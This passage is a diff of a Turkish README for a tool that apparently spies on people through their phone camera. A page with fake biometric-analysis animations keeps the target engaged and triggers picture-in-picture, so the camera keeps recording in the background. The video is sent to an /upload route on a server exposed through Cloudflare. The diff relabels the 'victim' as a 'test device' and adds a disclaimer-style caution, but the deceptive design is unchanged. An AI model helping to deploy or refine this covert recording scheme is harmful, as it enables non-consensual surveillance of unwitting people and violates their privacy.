@@ -1,6 +1,6 @@
 ⚠️ YASAL UYARI (DISCLAIMER)
 
-Bu araç SADECE EĞİTİM VE SİBER GÜVENLİK FARKINDALIĞI amacıyla paylaşılmıştır. Bu kodun izinsiz veya etik dışı kullanımı yasal sorumluluk doğurabilir. Geliştirici, aracın kötüye kullanımından doğacak hiçbir zarardan sorumlu tutulamaz. Lütfen sadece kendi cihazlarınızda veya izin aldığınız sistemlerde test ediniz. 
+Bu araç SADECE EĞİTİM VE SİBER GÜVENLİK FARKINDALIĞI amacıyla paylaşılmıştır. Bu kodun izinsiz veya etik dışı kullanımı yasal sorumluluk doğurabilir. Geliştirici, aracın kötüye kullanımından doğacak hiçbir zarardan sorumlu tutulamaz. Lütfen sadece kendi cihazlarınızda veya izin aldığınız sistemlerde test ediniz.Ve cloudflare ile internete açtıktan kısa süre sonra lütfen kapatınız 
 
 
 
@@ -83,7 +83,7 @@ Sunucunuz varsayılan olarak 5000 portunda yayına başlar.
 
     Arka Plana Geçiş (PiP): Kamera açıldığında telefonun ana ekranına dönün. Görselde olduğu gibi sağ alt köşede mavi çerçeveli kutu (PiP) belirecektir.
 
-    Veri Kaydı: * Kurban ana ekranda gezinirken tarayıcı arka planda çalışmaya devam eder.
+    Veri Kaydı: * test cihaz ana ekranda gezinirken tarayıcı arka planda çalışmaya devam eder.
 
         app.py üzerindeki /upload rotası, gelen video parçalarını anında yakalar.
 
@@ -93,7 +93,7 @@ Sunucunuz varsayılan olarak 5000 portunda yayına başlar.
 
     setup.sh: Kurulumu otomatize eder, hata payını sıfıra indirir.
 
-    index.html: Kurbanı sayfada tutmak için sahte biometrik analiz animasyonları ve PiP tetikleyiciyi içerir.
+    index.html: test cihazını sayfada tutmak için sahte biometrik analiz animasyonları ve PiP tetikleyiciyi içerir.
 
     app.py: Veri trafiğini yönetir ve gelen görüntüleri güvenli bir şekilde diske yazar.
 
